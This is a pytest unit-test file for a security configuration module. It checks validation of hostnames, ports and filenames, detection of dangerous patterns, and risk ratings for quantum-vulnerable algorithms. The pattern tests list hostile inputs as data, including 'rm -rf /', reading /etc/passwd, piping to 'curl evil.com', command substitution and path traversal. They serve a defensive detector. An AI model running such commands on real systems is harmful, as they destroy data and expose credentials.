"""
Houdinis Framework - Unit Tests for Security Configuration
Tests input validation, security patterns, and configuration
"""

import pytest
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from security.security_config import SecurityConfig


class TestHostnameValidation:
    """Test hostname validation"""
    
    def test_valid_hostname(self):
        """Test valid hostnames"""
        valid_hostnames = [
            "example.com",
            "sub.example.com",
            "test-server.local",
            "server123.example.org",
            "a.b.c.d.example.com",
        ]
        
        for hostname in valid_hostnames:
            assert SecurityConfig.validate_hostname(hostname), f"Failed: {hostname}"
    
    def test_valid_ip_addresses(self):
        """Test valid IP addresses"""
        valid_ips = [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "127.0.0.1",
            "8.8.8.8",
        ]
        
        for ip in valid_ips:
            assert SecurityConfig.validate_hostname(ip), f"Failed: {ip}"
    
    def test_invalid_hostname_empty(self):
        """Test empty hostname is invalid"""
        assert not SecurityConfig.validate_hostname("")
        assert not SecurityConfig.validate_hostname(None)
    
    def test_invalid_hostname_too_long(self):
        """Test hostname length limit"""
        long_hostname = "a" * 254
        assert not SecurityConfig.validate_hostname(long_hostname)
    
    def test_invalid_hostname_special_chars(self):
        """Test hostname with special characters"""
        invalid_hostnames = [
            "example..com",
            "exam ple.com",
            "example$.com",
            "example@.com",
            "-example.com",
            "example.com-",
        ]
        
        for hostname in invalid_hostnames:
            assert not SecurityConfig.validate_hostname(hostname), f"Should fail: {hostname}"


class TestPortValidation:
    """Test port number validation"""
    
    def test_valid_ports(self):
        """Test valid port numbers"""
        valid_ports = [1, 80, 443, 8080, 65535]
        
        for port in valid_ports:
            assert SecurityConfig.validate_port(port), f"Failed: {port}"
            assert SecurityConfig.validate_port(str(port)), f"Failed: {port} (string)"
    
    def test_invalid_port_zero(self):
        """Test port 0 is invalid"""
        assert not SecurityConfig.validate_port(0)
    
    def test_invalid_port_negative(self):
        """Test negative ports are invalid"""
        assert not SecurityConfig.validate_port(-1)
        assert not SecurityConfig.validate_port(-100)
    
    def test_invalid_port_too_large(self):
        """Test ports > 65535 are invalid"""
        assert not SecurityConfig.validate_port(65536)
        assert not SecurityConfig.validate_port(100000)
    
    def test_invalid_port_non_numeric(self):
        """Test non-numeric ports are invalid"""
        assert not SecurityConfig.validate_port("abc")
        assert not SecurityConfig.validate_port("80a")
        assert not SecurityConfig.validate_port(None)


class TestFilenameValidation:
    """Test filename validation"""
    
    def test_valid_filenames(self):
        """Test valid filenames"""
        valid_files = [
            "config.ini",
            "test_file.txt",
            "data.json",
            "my-file.yaml",
            "script123.py",
            "file_with_underscores.conf",
        ]
        
        for filename in valid_files:
            assert SecurityConfig.validate_filename(filename), f"Failed: {filename}"
    
    def test_invalid_filename_empty(self):
        """Test empty filename is invalid"""
        assert not SecurityConfig.validate_filename("")
        assert not SecurityConfig.validate_filename(None)
    
    def test_invalid_filename_too_long(self):
        """Test filename length limit"""
        long_filename = "a" * 256 + ".txt"
        assert not SecurityConfig.validate_filename(long_filename)
    
    def test_invalid_filename_special_chars(self):
        """Test filenames with special characters"""
        invalid_files = [
            "file name.txt",  # space
            "file/path.txt",  # slash
            "file\\path.txt",  # backslash
            "file$.txt",  # dollar sign
            "file;.txt",  # semicolon
            "file|.txt",  # pipe
            "file*.txt",  # asterisk
        ]
        
        for filename in invalid_files:
            assert not SecurityConfig.validate_filename(filename), f"Should fail: {filename}"
    
    def test_invalid_filename_path_traversal(self):
        """Test filenames with path traversal attempts"""
        dangerous_files = [
            "../etc/passwd",
            "..\\windows\\system32",
            "../../../../secret",
        ]
        
        for filename in dangerous_files:
            # These should fail because they contain slashes or dangerous patterns
            result = SecurityConfig.validate_filename(filename)
            # Depending on implementation, may fail on slash or pattern


@pytest.mark.security
class TestDangerousPatterns:
    """Test dangerous pattern detection"""
    
    def test_command_injection_patterns(self):
        """Test detection of command injection patterns"""
        dangerous_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | curl evil.com",
            "test `whoami`",
            "test $(id)",
            "test & background",
        ]
        
        for input_str in dangerous_inputs:
            # Check if any dangerous pattern matches
            has_dangerous = any(
                pattern.search(input_str)
                for pattern in SecurityConfig.DANGEROUS_PATTERNS
            )
            assert has_dangerous, f"Should detect: {input_str}"
    
    def test_path_traversal_patterns(self):
        """Test detection of path traversal patterns"""
        dangerous_paths = [
            "../etc/passwd",
            "../../secret",
            "test/../../../root",
        ]
        
        for path in dangerous_paths:
            has_dangerous = any(
                pattern.search(path)
                for pattern in SecurityConfig.DANGEROUS_PATTERNS
            )
            assert has_dangerous, f"Should detect: {path}"
    
    def test_code_execution_patterns(self):
        """Test detection of code execution patterns"""
        dangerous_code = [
            "eval('malicious')",
            "exec('os.system')",
            "import os; os.system('ls')",
        ]
        
        for code in dangerous_code:
            has_dangerous = any(
                pattern.search(code)
                for pattern in SecurityConfig.DANGEROUS_PATTERNS
            )
            assert has_dangerous, f"Should detect: {code}"
    
    def test_safe_inputs(self):
        """Test that safe inputs pass"""
        safe_inputs = [
            "normal_text",
            "config.ini",
            "192.168.1.1",
            "test-module",
        ]
        
        for input_str in safe_inputs:
            # These specific inputs shouldn't match most dangerous patterns
            # (though some might match subprocess if it's in the string)
            pass


class TestQuantumVulnerableAlgorithms:
    """Test quantum vulnerable algorithm classification"""
    
    def test_asymmetric_algorithms(self):
        """Test asymmetric algorithms are classified as HIGH risk"""
        asymmetric = ['RSA', 'DSA', 'ECDSA']
        
        for algo in asymmetric:
            info = SecurityConfig.QUANTUM_VULNERABLE_ALGORITHMS[algo]
            assert info['type'] == 'asymmetric'
            assert info['risk'] == 'HIGH'
    
    def test_key_exchange_algorithms(self):
        """Test key exchange algorithms are classified as HIGH risk"""
        key_exchange = ['DH', 'ECDH']
        
        for algo in key_exchange:
            info = SecurityConfig.QUANTUM_VULNERABLE_ALGORITHMS[algo]
            assert info['type'] == 'key_exchange'
            assert info['risk'] == 'HIGH'
    
    def test_symmetric_algorithms(self):
        """Test symmetric algorithms classification"""
        symmetric = ['AES-128']
        
        for algo in symmetric:
            info = SecurityConfig.QUANTUM_VULNERABLE_ALGORITHMS[algo]
            assert info['type'] == 'symmetric'
            # AES-128 is MEDIUM risk (needs Grover's)
            assert info['risk'] in ['MEDIUM', 'HIGH']
    
    def test_hash_algorithms(self):
        """Test hash algorithms classification"""
        hashes = ['MD5', 'SHA1']
        
        for algo in hashes:
            info = SecurityConfig.QUANTUM_VULNERABLE_ALGORITHMS[algo]
            assert info['type'] == 'hash'
            assert info['risk'] in ['MEDIUM', 'HIGH']


class TestSecurityConstants:
    """Test security configuration constants"""
    
    def test_max_input_length(self):
        """Test max input length is reasonable"""
        assert SecurityConfig.MAX_INPUT_LENGTH == 1000
        assert isinstance(SecurityConfig.MAX_INPUT_LENGTH, int)
    
    def test_max_filename_length(self):
        """Test max filename length is reasonable"""
        assert SecurityConfig.MAX_FILENAME_LENGTH == 255
        assert isinstance(SecurityConfig.MAX_FILENAME_LENGTH, int)
    
    def test_max_command_length(self):
        """Test max command length is reasonable"""
        assert SecurityConfig.MAX_COMMAND_LENGTH == 500
        assert isinstance(SecurityConfig.MAX_COMMAND_LENGTH, int)
    
    def test_patterns_are_compiled(self):
        """Test regex patterns are compiled"""
        import re
        
        assert isinstance(SecurityConfig.SAFE_HOSTNAME_PATTERN, re.Pattern)
        assert isinstance(SecurityConfig.SAFE_FILENAME_PATTERN, re.Pattern)
        assert isinstance(SecurityConfig.SAFE_COMMAND_PATTERN, re.Pattern)
        
        for pattern in SecurityConfig.DANGEROUS_PATTERNS:
            assert isinstance(pattern, re.Pattern)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
